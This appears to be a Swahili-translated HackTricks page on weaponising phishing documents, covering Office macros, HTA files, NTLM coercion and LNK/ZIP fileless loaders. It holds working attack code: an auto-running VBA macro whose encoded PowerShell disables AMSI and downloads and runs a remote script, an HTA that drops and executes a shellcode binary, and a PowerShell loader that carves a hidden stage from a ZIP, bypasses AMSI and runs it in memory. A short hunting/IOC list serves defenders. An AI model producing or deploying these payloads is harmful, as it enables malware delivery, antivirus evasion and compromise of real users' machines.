# Phishing Faili & Nyaraka

{{#include ../../banners/hacktricks-training.md}}

## Nyaraka za Office

Microsoft Word hufanya uthibitishaji wa data za faili kabla ya kufungua faili. Uthibitishaji wa data hufanywa kwa njia ya utambuzi wa muundo wa data, dhidi ya kiwango cha OfficeOpenXML. Kama hitilafu yoyote itatokea wakati wa utambuzi wa muundo wa data, faili inayochunguzwa haitafunguliwa.

Kawaida, Word files containing macros use the `.docm` extension. Hata hivyo, inawezekana kubadilisha jina la faili kwa kubadilisha nyongeza ya faili na bado kuhifadhi uwezo wao wa kutekeleza macro.\
Kwa mfano, faili ya RTF kwa kawaida haisaidii macros, kwa muundo, lakini faili ya DOCM iliyobadilishwa jina kuwa RTF itashughulikiwa na Microsoft Word na itakuwa na uwezo wa kutekeleza macro.\
Miundo na mekanisimu za ndani zile zile zinatumika kwa programu zote za Microsoft Office Suite (Excel, PowerPoint etc.).

Unaweza kutumia amri ifuatayo kuchunguza ni nyongeza zipi zitakazotekelezwa na programu fulani za Office:
```bash
assoc | findstr /i "word excel powerp"
```
Faili za DOCX zinazorejelea kiolezo cha mbali (File –Options –Add-ins –Manage: Templates –Go) kinachojumuisha macros zinaweza pia “kutekeleza” macros.

### Kupakia Picha ya Nje

Nenda kwa: _Insert --> Quick Parts --> Field_\
_**Jamii**: Links and References, **Majina ya field**: includePicture, na **Jina la Faili au URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Inawezekana kutumia macros kuendesha msimbo wa aina yoyote kutoka kwa hati.

#### Autoload functions

Kadiri zinavyozidi kuwa za kawaida, ndivyo AV inavyoweza kuzitambua.

- AutoOpen()
- Document_Open()

#### Mifano ya msimbo ya Macros
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Ondoa metadata kwa mikono

Nenda kwa **File > Info > Inspect Document > Inspect Document**, ambayo itaonyesha Document Inspector. Bonyeza **Inspect** kisha **Remove All** kando ya **Document Properties and Personal Information**.

#### Upanuzi wa Doc

Wakati umemaliza, chagua dropdown ya **Save as type**, badilisha fomati kutoka **`.docx`** kuwa **Word 97-2003 `.doc`**.\
Fanya hivi kwa sababu huwezi kuhifadhi macros ndani ya **`.docx`** na kuna stigma kuhusiana na extension ya macro-enabled **`.docm`** (mf., ikoni ya thumbnail ina `!` kubwa na baadhi ya web/email gateway huziweka block kabisa). Kwa hivyo, extension ya legacy **`.doc`** ni suluhisho bora.

#### Vizalishaji vya Macros Hatari

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Faili za HTA

HTA ni programu ya Windows inayochanganya **HTML na scripting languages (such as VBScript and JScript)**. Inatengeneza interface ya mtumiaji na inaendeshwa kama programu "fully trusted", bila vizingiti vya modeli ya usalama ya browser.

HTA inaendeshwa kwa kutumia **`mshta.exe`**, ambayo kwa kawaida **imewekwa** pamoja na **Internet Explorer**, na hivyo **`mshta` inategemea IE**. Hivyo ikiwa imeondolewa, HTA haziwezi kuendeshwa.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Kulazimisha NTLM Authentication

Kuna njia kadhaa za **kulazimisha NTLM authentication "kwa mbali"**, kwa mfano, unaweza kuongeza **picha zisizoonekana** kwenye barua pepe au HTML ambazo mtumiaji atafikia (hata HTTP MitM?). Au tuma mwathiriwa **anwani ya mafaili** ambayo itatazua **authentication** tu kwa **kufungua folda.**

**Angalia mawazo haya na mengine kwenye kurasa zifuatazo:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Usisahau kuwa hutaweza tu kuiba hash au authentication lakini pia **kutekeleza NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Kampeni zenye ufanisi mkubwa huzalisha ZIP inayojumuisha nyaraka mbili halali za kuibua (PDF/DOCX) na .lnk hatarishi. Njia ni kwamba loader halisi ya PowerShell imehifadhiwa ndani ya raw bytes za ZIP baada ya alama ya kipekee, na .lnk inachonga na kuendesha yote ndani ya kumbukumbu.

Mtiririko wa kawaida unaotekelezwa na .lnk PowerShell one-liner:

1) Tafuta ZIP asili katika njia za kawaida: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, na mzazi wa current working directory.  
2) Soma bytes za ZIP na tafuta marker iliyowekwa kimagurudumu (mfano, xFIQCV). Kila kitu baada ya marker ni PowerShell payload iliyowekwa.  
3) Nakili ZIP hadi %ProgramData%, ifungue hapo, na fungua decoy .docx ili ionekane halali.  
4) Kuepuka AMSI kwa mchakato wa sasa: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
5) Deobfuscate hatua inayofuata (mfano, ondoa herufi zote #) na itekeleze ndani ya kumbukumbu.

Mfano wa skeleton ya PowerShell ili kuchonga na kuendesha hatua iliyowekwa:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Vidokezo
- Delivery often abuses reputable PaaS subdomains (e.g., *.herokuapp.com) and may gate payloads (serve benign ZIPs based on IP/UA).
- Sehemu inayofuata mara nyingi hu-decrypt base64/XOR shellcode na kuitekeleza kupitia Reflection.Emit + VirtualAlloc ili kupunguza artifacts za diski.

Persistence iliyotumika katika mnyororo huo huo
- COM TypeLib hijacking ya Microsoft Web Browser control ili IE/Explorer au app yoyote inayoi-embed irejeshe payload moja kwa moja. See details and ready-to-use commands here:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP files containing the ASCII marker string (e.g., xFIQCV) appended to the archive data.
- .lnk that enumerates parent/user folders to locate the ZIP and opens a decoy document.
- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Long-running business threads ending with links hosted under trusted PaaS domains.

## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
